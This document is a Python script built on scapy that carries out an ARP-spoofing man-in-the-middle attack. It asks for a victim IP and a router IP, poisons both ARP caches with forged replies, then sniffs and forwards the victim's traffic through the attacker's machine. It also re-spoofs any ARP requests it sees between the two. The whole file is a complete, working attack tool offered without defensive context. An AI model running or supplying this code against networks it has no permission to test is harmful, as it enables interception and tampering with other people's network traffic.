from scapy.all import *

DEVICE_MAC = get_if_hwaddr(conf.iface)

class Device:
    def __init__(self,ip):
        self.ip = ip
        self.mac = self.discover_mac()
    def discover_mac(self):
        response = sr1(ARP(op=ARP.who_has,pdst=self.ip),verbose=0,timeout=5)
        while response==None:
            print('Error discovering MAC address. Retrying...')
            response = sr1(ARP(op=ARP.who_has,pdst=self.ip),verbose=0,timeout=5)
        return response.hwsrc

def create_arp(op, hwsrc, hwdst, psrc, pdst, dst, src):
    packet = Ether()/ARP()
    packet[ARP].op = op         # ARP Reply
    packet[ARP].hwsrc = hwsrc   # Source MAC
    packet[ARP].hwdst = hwdst   # Destination MAC
    packet[ARP].psrc = psrc     # Source IP
    packet[ARP].pdst = pdst     # Destination IP
    packet[Ether].src = src     # ETH Source MAC
    packet[Ether].dst = hwdst   # ETH Destination MAC
    return packet

def spoofed_reply(psrc, pdst, hwdst):
    return create_arp(2, DEVICE_MAC, hwdst, psrc, pdst, hwdst, DEVICE_MAC)

# Listen for incoming and outgoing packets and forward them
def route(packet, victim, router):
    if IP in packet:
        # OUTGOING PACKETS
        if packet[IP].src == victim.ip and packet[Ether].dst == DEVICE_MAC:
            packet[Ether].src = DEVICE_MAC
            packet[Ether].dst = router.mac
        # INCOMING PACKETS
        elif packet[IP].dst == victim.ip and packet[Ether].src == router.mac:
            packet[Ether].src = DEVICE_MAC
            packet[Ether].dst = victim.mac
        try:
            sendp(packet,verbose=0)
        except (OSError, TypeError) as e:
            print('Error re-routing incoming packet, skipping...')
            print(len(packet),e)
    elif ARP in packet:
        if packet[ARP].op == 1 and packet[ARP].psrc == router.ip and packet[ARP].pdst == victim.ip:
            print('ARP request coming from router to victim')
            try:
                sendp(spoofed_reply(victim.ip,router.ip,router.mac),verbose=0)
                print('Sending fake response')
            except (OSError, TypeError):
                print('Error sending packet, skipping...')
            # sendp(packet,verbose=0)
        elif packet[ARP].op == 1 and packet[ARP].psrc == victim.ip and packet[ARP].pdst == router.ip:
            print('ARP request coming from victim to router')
            try:
                sendp(spoofed_reply(router.ip,victim.ip,victim.mac),verbose=0)
                print('Sending fake response')
            except (OSError, TypeError):
                print('Error sending packet, skipping...')
            # sendp(packet,verbose=0)
    else:
        try:
            sendp(packet,verbose=0)
        except (OSError, TypeError) as e:
            print('Error re-routing packet, skipping...')
            print(len(packet),e)

def mitm(victim, router):
    # Convert all MAC addresses to lowercase to keep consistency
    sendp(spoofed_reply(router.ip, victim.ip, victim.mac),verbose=0)
    sendp(spoofed_reply(victim.ip, router.ip, router.mac),verbose=0)
    print('Packets sent')
    sniff(iface=conf.iface, prn=lambda packet:route(packet, victim, router))

if __name__ == '__main__':
    victim = Device(input('Enter Victim IP: '))
    router = Device(input('Enter Router IP: '))
    mitm(victim,router)